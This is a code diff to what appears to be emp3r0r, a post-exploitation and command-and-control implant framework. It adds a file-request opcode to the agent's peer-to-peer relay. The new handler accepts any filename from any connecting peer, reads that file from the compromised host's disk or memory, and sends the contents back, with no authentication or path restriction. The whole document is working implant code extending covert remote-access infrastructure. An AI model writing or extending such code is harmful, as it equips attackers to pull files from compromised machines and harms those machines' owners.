@@ -13,6 +13,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 // Bridge protocol (single-byte opcode frame):
@@ -21,10 +22,11 @@ import (
 //                     [0xFF] ERR (then 2-byte LE error len, followed by UTF-8 message)
 
 const (
-	OpcodeConnectC2 byte = 0x01
-	OpcodePing      byte = 0x02
-	OpcodeOK        byte = 0x00
-	OpcodeErr       byte = 0xFF
+	OpcodeConnectC2   byte = 0x01
+	OpcodePing        byte = 0x02
+	OpcodeFileRequest byte = 0x03
+	OpcodeOK          byte = 0x00
+	OpcodeErr         byte = 0xFF
 
 	bridgeDialTimeout = 10 * time.Second
 )
@@ -157,6 +159,10 @@ func handleRelayConn(ctx context.Context, peer net.Conn) {
 		}
 		return
 
+	case OpcodeFileRequest:
+		handleFileRequest(peer)
+		return
+
 	case OpcodeConnectC2:
 		// proceed to dial C2
 	default:
@@ -213,4 +219,64 @@ func writeRelayError(w net.Conn, msg string) {
 	w.Write([]byte{OpcodeErr})
 	w.Write(lenBuf)
 	w.Write(b)
+}
+
+// handleFileRequest serves a file request over the existing P2P relay connection.
+// Protocol (after the 0x03 opcode has already been read):
+//
+//	Client → [4-byte LE filename-len][filename]
+//	Server → [0x00][4-byte LE data-len][data]   on success
+//	          [0xFF][2-byte LE msg-len][msg]      on error
+func handleFileRequest(peer net.Conn) {
+	peer.SetDeadline(time.Now().Add(bridgeDialTimeout))
+	defer peer.SetDeadline(time.Time{})
+
+	// Read 4-byte LE filename length
+	lenBuf := make([]byte, 4)
+	if _, err := io.ReadFull(peer, lenBuf); err != nil {
+		logging.Debugf("Mesh file: read filename len: %v", err)
+		writeRelayError(peer, "read filename len: "+err.Error())
+		return
+	}
+	nameLen := binary.LittleEndian.Uint32(lenBuf)
+	if nameLen == 0 || nameLen > 4096 {
+		writeRelayError(peer, "invalid filename length")
+		return
+	}
+
+	// Read filename
+	nameBuf := make([]byte, nameLen)
+	if _, err := io.ReadFull(peer, nameBuf); err != nil {
+		logging.Debugf("Mesh file: read filename: %v", err)
+		writeRelayError(peer, "read filename: "+err.Error())
+		return
+	}
+	filename := string(nameBuf)
+	logging.Infof("Mesh file: peer %s requesting %s", peer.RemoteAddr(), filename)
+
+	peer.SetDeadline(time.Time{}) // clear deadline before potentially slow file read
+
+	// Read file — ReadFileAgent handles both disk and mem:/// paths
+	data, err := util.ReadFileAgent(filename)
+	if err != nil {
+		logging.Warningf("Mesh file: %s not found locally, will attempt C2 fallback on peer side", filename)
+		writeRelayError(peer, "file not found: "+err.Error())
+		return
+	}
+
+	// Send OK + 4-byte LE data length + data
+	dataLen := uint32(len(data))
+	dataLenBuf := make([]byte, 4)
+	binary.LittleEndian.PutUint32(dataLenBuf, dataLen)
+	if _, err := peer.Write([]byte{OpcodeOK}); err != nil {
+		return
+	}
+	if _, err := peer.Write(dataLenBuf); err != nil {
+		return
+	}
+	if _, err := peer.Write(data); err != nil {
+		logging.Warningf("Mesh file: send data for %s: %v", filename, err)
+		return
+	}
+	logging.Infof("Mesh file: sent %d bytes of %s to %s", dataLen, filename, peer.RemoteAddr())
 }
